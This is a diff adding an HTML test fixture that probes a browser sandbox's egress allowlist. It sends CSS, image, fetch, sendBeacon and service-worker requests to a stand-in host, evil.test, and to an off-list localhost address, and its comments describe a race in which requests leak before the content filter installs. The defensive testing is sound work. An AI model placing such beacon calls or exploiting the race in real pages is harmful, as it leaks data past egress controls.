@@ -1,0 +1,58 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>SMOKE HARDENING</title>
+    <style>
+      #css-probe { width: 4px; height: 4px; background-image: url("http://evil.test/css"); }
+    </style>
+  </head>
+  <body>
+    <p id="status">hardening probe</p>
+    <div id="css-probe"></div>
+    <img id="data-image" alt="data image" src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" />
+    <img id="off-image" alt="off-list image" src="http://evil.test/image" />
+    <!-- Off-allowlist but SERVED. The allowlist is http://localhost:8099/*, and
+         127.0.0.1 is a different host to a URL pattern, while the fixture httpd
+         binds 127.0.0.1 and answers on both. So this is the one off-list resource
+         whose blocking is externally observable: if egress is enforced the access
+         log never records it; if enforcement is off, the GET lands. Every other
+         off-list URL here points at evil.test, which never resolves, so its
+         absence from the log proves nothing. -->
+    <img id="off-host-image" alt="off-host image" src="http://127.0.0.1:8099/off-list-probe" />
+    <script>
+      function probe(value) {
+        fetch('/probe?' + value).catch(function () {});
+      }
+      document.getElementById('data-image').addEventListener('load', function () {
+        probe('data-image=rendered');
+      });
+      document.addEventListener('securitypolicyviolation', function (event) {
+        probe('csp=' + encodeURIComponent(event.blockedURI || 'unknown'));
+      });
+      fetch('http://evil.test/fetch').catch(function () { probe('fetch=settled'); });
+      try { navigator.sendBeacon('http://evil.test/beacon', 'smoke'); } catch (_) {}
+      probe('beacon=attempted');
+      if (navigator.serviceWorker) {
+        navigator.serviceWorker.register('/sw.js').then(function () {
+          return navigator.serviceWorker.ready;
+        }).then(function (registration) {
+          if (registration.active) registration.active.postMessage('off-list-fetch');
+        }).catch(function () {});
+      }
+      // A SECOND off-list subresource, requested late. The one in the markup above
+      // races the native content filter's own installation: the filter is compiled
+      // and added asynchronously (webkit_user_content_filter_store_save + its
+      // completion callback), so on a loaded machine the document's subresources
+      // can go out before add_filter has run. Measured: blocked on an idle host,
+      // leaked 3/3 under load. This request fires well after that window, so
+      // "blocked" here is a deterministic statement about steady-state enforcement,
+      // while the markup one above is the boot-race detector.
+      setTimeout(function () {
+        var late = new Image();
+        late.src = 'http://127.0.0.1:8099/off-list-probe-late';
+      }, 3000);
+      setTimeout(function () { probe('ready=1'); }, 4500);
+    </script>
+  </body>
+</html>
